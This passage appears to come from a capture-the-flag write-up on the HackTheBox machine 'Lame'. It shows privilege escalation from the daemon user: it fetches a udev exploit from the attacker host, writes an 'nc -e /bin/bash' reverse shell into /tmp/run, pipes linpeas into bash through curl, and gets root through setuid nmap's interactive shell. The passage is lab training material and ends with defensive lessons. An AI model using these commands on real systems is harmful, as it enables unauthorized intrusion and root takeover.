root      1485  0.0  0.0      0     0 ?        S<   03:22   0:00 [ksuspend_usbd]
root      1490  0.0  0.0      0     0 ?        S<   03:22   0:00 [khubd]
root      2348  0.0  0.0      0     0 ?        S<   03:22   0:00 [scsi_eh_2]
root      2568  0.0  0.0      0     0 ?        S<   03:22   0:01 [kjournald]
root      2742  0.0  0.1   2240   756 ?        S<s  03:22   0:00 /sbin/udevd --d
root      3138  0.0  0.0      0     0 ?        S<   03:22   0:00 [kpsmoused]
dhcp      4109  0.0  0.1   2436   832 ?        S<s  03:22   0:00 dhclient3 -e IF
root      4161  0.0  0.0      0     0 ?        S<   03:22   0:00 [kjournald]
root      4329  0.0  0.0      0     0 ?        S<   03:22   0:00 [vmmemctl]
root      4478  0.0  0.7   6508  3716 ?        S    03:22   0:27 /usr/sbin/vmtoo
root      4511  0.0  1.4  13708  7680 ?        S    03:22   0:00 /usr/lib/vmware
daemon    4654  0.0  0.1   1836   520 ?        Ss   03:22   0:00 /sbin/portmap
statd     4672  0.0  0.1   1900   720 ?        Ss   03:22   0:00 /sbin/rpc.statd
root      4678  0.0  0.0      0     0 ?        S<   03:22   0:00 [rpciod/0]
root      4693  0.0  0.1   3648   560 ?        Ss   03:22   0:00 /usr/sbin/rpc.i
root      4923  0.0  0.0   1716   492 tty4     Ss+  03:22   0:00 /sbin/getty 384
root      4924  0.0  0.0   1716   492 tty5     Ss+  03:22   0:00 /sbin/getty 384
root      4929  0.0  0.0   1716   492 tty2     Ss+  03:22   0:00 /sbin/getty 384
root      4931  0.0  0.0   1716   492 tty3     Ss+  03:22   0:00 /sbin/getty 384
root      4934  0.0  0.0   1716   484 tty6     Ss+  03:22   0:00 /sbin/getty 384
syslog    4974  0.0  0.1   1936   684 ?        Ss   03:22   0:00 /sbin/syslogd -
root      5025  0.0  0.1   1872   544 ?        S    03:22   0:00 /bin/dd bs 1 if
klog      5027  0.0  0.4   3288  2132 ?        Ss   03:22   0:00 /sbin/klogd -P
bind      5052  0.0  1.4  35408  7688 ?        Ssl  03:22   0:00 /usr/sbin/named
root      5076  0.0  0.1   5312   996 ?        Ss   03:22   0:00 /usr/sbin/sshd
root      5157  0.0  0.2   2768  1304 ?        S    03:22   0:00 /bin/sh /usr/bi
mysql     5199  0.0  3.3 127560 17028 ?        Sl   03:22   0:05 /usr/sbin/mysql
root      5201  0.0  0.1   1700   556 ?        S    03:22   0:00 logger -p daemo
postgres  5283  0.0  0.9  41340  5068 ?        S    03:22   0:00 /usr/lib/postgr
postgres  5286  0.0  0.2  41340  1376 ?        Ss   03:22   0:02 postgres: write
postgres  5287  0.0  0.2  41340  1188 ?        Ss   03:22   0:02 postgres: wal w
postgres  5288  0.0  0.2  41476  1404 ?        Ss   03:22   0:00 postgres: autov
postgres  5289  0.0  0.2  12660  1152 ?        Ss   03:22   0:00 postgres: stats
daemon    5310  0.0  0.0   2316   424 ?        SNs  03:22   0:00 distccd --daemo
daemon    5311  0.0  0.1   2316   560 ?        SN   03:22   0:00 distccd --daemo
root      5365  0.0  0.0      0     0 ?        S    03:22   0:00 [lockd]
root      5366  0.0  0.0      0     0 ?        S<   03:22   0:00 [nfsd4]
root      5367  0.0  0.0      0     0 ?        S    03:22   0:00 [nfsd]
root      5368  0.0  0.0      0     0 ?        S    03:22   0:00 [nfsd]
root      5369  0.0  0.0      0     0 ?        S    03:22   0:00 [nfsd]
root      5370  0.0  0.0      0     0 ?        S    03:22   0:00 [nfsd]
root      5371  0.0  0.0      0     0 ?        S    03:22   0:00 [nfsd]
root      5372  0.0  0.0      0     0 ?        S    03:22   0:00 [nfsd]
root      5373  0.0  0.0      0     0 ?        S    03:22   0:00 [nfsd]
root      5374  0.0  0.0      0     0 ?        S    03:22   0:00 [nfsd]
root      5378  0.0  0.0   2424   336 ?        Ss   03:22   0:00 /usr/sbin/rpc.m
root      5446  0.0  0.3   5412  1732 ?        Ss   03:22   0:00 /usr/lib/postfi
postfix   5449  0.0  0.3   5460  1796 ?        S    03:22   0:00 qmgr -l -t fifo
root      5454  0.0  0.2   5388  1224 ?        Ss   03:22   0:00 /usr/sbin/nmbd
root      5456  0.0  0.3   7724  1704 ?        Ss   03:22   0:00 /usr/sbin/smbd
root      5460  0.0  0.1   7724   812 ?        S    03:22   0:00 /usr/sbin/smbd
snmp      5462  0.0  0.7   8488  3764 ?        S    03:22   0:04 /usr/sbin/snmpd
root      5481  0.0  0.1   2424   868 ?        Ss   03:22   0:00 /usr/sbin/xinet
daemon    5522  0.0  0.1   2316   560 ?        SN   03:22   0:00 distccd --daemo
daemon    5523  0.0  0.1   2316   560 ?        SN   03:22   0:00 distccd --daemo
proftpd   5536  0.0  0.3   9948  1596 ?        Ss   03:23   0:00 proftpd: (accep
daemon    5552  0.0  0.0   1984   424 ?        Ss   03:23   0:00 /usr/sbin/atd
root      5565  0.0  0.1   2104   896 ?        Ss   03:23   0:00 /usr/sbin/cron
root      5595  0.0  0.0   2052   352 ?        Ss   03:23   0:00 /usr/bin/jsvc -
root      5596  0.0  0.0   2052   480 ?        S    03:23   0:00 /usr/bin/jsvc -
tomcat55  5598  0.2 17.3 364024 89656 ?        Sl   03:23   1:36 /usr/bin/jsvc -
root      5618  0.0  0.5  10596  2944 ?        Ss   03:23   0:00 /usr/sbin/apach
root      5639  0.0  5.1  66344 26472 ?        Sl   03:23   0:00 /usr/bin/rmireg
root      5643  0.1  0.4  12208  2568 ?        Sl   03:23   0:48 ruby /usr/sbin/
root      5653  0.0  0.4   8540  2360 ?        S    03:23   0:01 /usr/bin/unreal
root      5657  0.0  0.0   1716   492 tty1     Ss+  03:23   0:00 /sbin/getty 384
root      5660  0.0  2.3  13928 12012 ?        S    03:23   0:07 Xtightvnc :0 -d
root      5666  0.0  0.2   2724  1188 ?        S    03:23   0:00 /bin/sh /root/.
root      5669  0.0  0.4   5936  2576 ?        S    03:23   0:00 xterm -geometry
root      5671  0.0  0.9   8988  4988 ?        S    03:23   0:09 fluxbox
root      5694  0.0  0.3   2852  1548 pts/0    Ss+  03:23   0:00 -bash
www-data  9780  0.0  0.3  10596  1960 ?        S    06:54   0:00 /usr/sbin/apach
www-data  9781  0.0  0.3  10596  1960 ?        S    06:54   0:00 /usr/sbin/apach
www-data  9782  0.0  0.3  10596  1960 ?        S    06:54   0:00 /usr/sbin/apach
www-data  9783  0.0  0.3  10596  1960 ?        S    06:54   0:00 /usr/sbin/apach
www-data  9784  0.0  0.3  10596  1960 ?        S    06:54   0:00 /usr/sbin/apach
daemon   11595  0.0  0.2   3232  1420 ?        SN   13:10   0:00 sh -c (nc -e /b
daemon   11596  0.0  0.2   3236  1432 ?        SN   13:10   0:00 bash
daemon   11599  0.0  0.1   1716   516 ?        SN   13:10   0:00 script /dev/nul
daemon   11600  0.0  0.0   1720   408 ?        SN   13:10   0:00 script /dev/nul
daemon   11601  0.0  0.3   3424  1888 pts/1    SNs  13:10   0:00 bash
postfix  11673  0.0  0.3   5420  1644 ?        S    13:21   0:00 pickup -l -t fi
daemon   11710  0.0  0.1   2364   932 pts/1    RN+  13:30   0:00 ps -aux
daemon@lame:/tmp$ 
```

Startup a server on your attack machine.

`python3 -m http.server 80`

In the target, the machine downloads the exploit file.

`wget http://10.10.16.11/8572.c`

Compile the exploit.

`gcc 8572.c -o 8572`

To run it, let’s look at the usage instructions.

```bash
 /* Usage:
 *
 *   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, 
 *   usually is the udevd PID minus 1) as argv[1].
 *
 *   The exploit will execute /tmp/run as root so throw whatever payload you 
 *   want in there.
 */
```

We need to do two things:
- Figure out the PID of the udevd netlink socket
- Create a run file in /tmp and add a reverse shell to it. Since any payload in that file will run as root, we’ll get a privileged reverse shell.

To get the PID of the udevd process, run the following command.


```output
daemon@lame:/tmp$ ps -aux | grep dev 
Warning: bad ps syntax, perhaps a bogus '-'? See http://procps.sf.net/faq.html
root      2742  0.0  0.1   2240   756 ?        S<s  03:22   0:00 /sbin/udevd --daemon
snmp      5462  0.0  0.7   8488  3764 ?        S    03:22   0:04 /usr/sbin/snmpd -Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1
daemon   11599  0.0  0.1   1716   516 ?        SN   13:10   0:00 script /dev/null -c bash
daemon   11600  0.0  0.0   1720   408 ?        RN   13:10   0:00 script /dev/null -c bash
daemon   11714  0.0  0.1   1784   532 pts/1    RN+  13:31   0:00 grep dev
daemon@lame:/tmp$ 
```

```output
daemon@lame:/tmp$ cat /proc/net/netlink
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
ddf3f800 0   0      00000000 0        0        00000000 2
df722400 4   0      00000000 0        0        00000000 2
dd350800 7   0      00000000 0        0        00000000 2
dd841600 9   0      00000000 0        0        00000000 2
dd849400 10  0      00000000 0        0        00000000 2
ddf3fc00 15  0      00000000 0        0        00000000 2
df40b800 15  2741   00000001 0        0        00000000 2
ddde7800 16  0      00000000 0        0        00000000 2
df457000 18  0      00000000 0        0        00000000 2
daemon@lame:/tmp$ 
```

Next, create a **run** file in /tmp and add a reverse shell to it.

```output
daemon@lame:/tmp$ echo '#!/bin/bash' > run
daemon@lame:/tmp$ echo 'nc -e /bin/bash 10.10.16.11 9001' >> run
daemon@lame:/tmp$ cat run
#!/bin/bash
nc -e /bin/bash 10.10.16.11 9001
daemon@lame:/tmp$ 
```

Set up a listener on your attack machine to receive the reverse shell.

`nc -nlvp 9001`

Run the exploit on the attack machine. As mentioned in the instructions, the exploit takes the PID of the udevd netlink socket as an argument.

`daemon@lame:/tmp$ ./8572 2741`

```output
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Doesn't work. Now used a script to help us whit exploitation.

`daemon@lame:/tmp$ curl http://10.10.16.11/linpeas.sh | bash`

I see a lot of data. let's check some data interesting.

```output
OS: Linux version 2.6.24-16-server (buildd@palmer) (gcc version 4.2.3 (Ubuntu 4.2.3-2ubuntu7)) #1 SMP Thu Apr 10 13:58:00 UTC 2008
User & Groups: uid=1(daemon[0m[0m) gid=1(daemon[0m[0m) groups=1(daemon[0m[0m)
Hostname: lame
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
[+] nmap is available for network discover & port scanning, you should use it yourself
```

Let's go to a quick google search and search about *gtfobins*.
GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

`-rwsr-xr-x 1 root root 763K Apr  8  2008 /usr/bin/nmap`

There is a script Nmap used by the root. Let's go to search in gtfobins web about any vulnerable.

The interactive mode, available in versions 2.02 to 5.21, can be used to execute shell commands.

```output
sudo nmap --interactive
nmap> !sh
```

```output
daemon@lame:/tmp$ nmap -v

Starting Nmap 4.53 ( http://insecure.org ) at 2022-04-10 14:29 EDT
Read data files from: /usr/share/nmap
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.032 seconds
           Raw packets sent: 0 (0B) | Rcvd: 0 (0B)
daemon@lame:/tmp$ nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
sh-3.2# id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
sh-3.2# whoami
root
```

We have root.

# Lessons Learned
1. Always run a full port scan! We wouldn’t have discovered the vulnerable distributed compiler daemon distcc running on port 3632 if we only ran the initial scan. This gave us an initial foothold on the machine where we were eventually able to escalate privileges to root.
2. Always update and patch your software! In both exploitation methods, we leveraged publicly disclosed vulnerabilities that have security updates and patches available.
3. Samba ports should not be exposed! Use a firewall to deny access to these services from outside your network. Moreover, restrict access to your server to valid users only and disable WRITE access if not necessary.

